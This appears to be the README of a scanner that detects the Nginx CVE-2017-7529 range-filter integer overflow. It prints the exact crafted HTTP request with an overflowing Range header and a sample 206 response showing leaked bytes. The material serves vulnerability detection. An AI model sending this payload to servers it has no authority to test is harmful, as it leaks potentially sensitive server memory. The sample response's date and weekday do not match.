# Cve_Finder_2017-7529
The tool is used to detect whether a server is vulnerable to Nginx Remote Integer Overflow CVE (2017-7529)

## Nginix Remote Integer Overflow

Nginx CVE-2017-7529 Remote Integer Overflow Vulnerability. Description: Nginx versions since 0.5. 6 up to and including 1.13. 2 are vulnerable to integer overflow vulnerability in nginx range filter module resulting into leak of potentially sensitive information triggered by specially crafted request.The attacker sends a specially crafted header Range in HTTP Request which causes the vulnerable Nginx Server to overflow memory bytes of server or leaks its content.

The response code for detecting Nginx Remote Overflow is 206 and Partial Content is recieved in HTTP status line. 

### Request

GET /domain HTTP/1.1
Accept-Encoding: identity
Range: bytes=-17208,-9223372036854758792
Host: 127.0.0.1:8000
Connection: close
User-Agent: Python-urllib/2.7

## Response

HTTP/1.1 206 Partial Content
Server: nginx/1.13.1
Date: Mon, 21 May 2020 06:51:52 GMT
Content-Type: multipart/byteranges; boundary=00000000000000000002
Connection: close
Last-Modified: Mon, 17 Jul 2017 02:19:08 GMT
ETag: "40c9-5547a060fdf00"
X-Proxy-Cache: HIT
--00000000000000000002
Content-Type: text/html
Content-Range: bytes -623-16584/16585
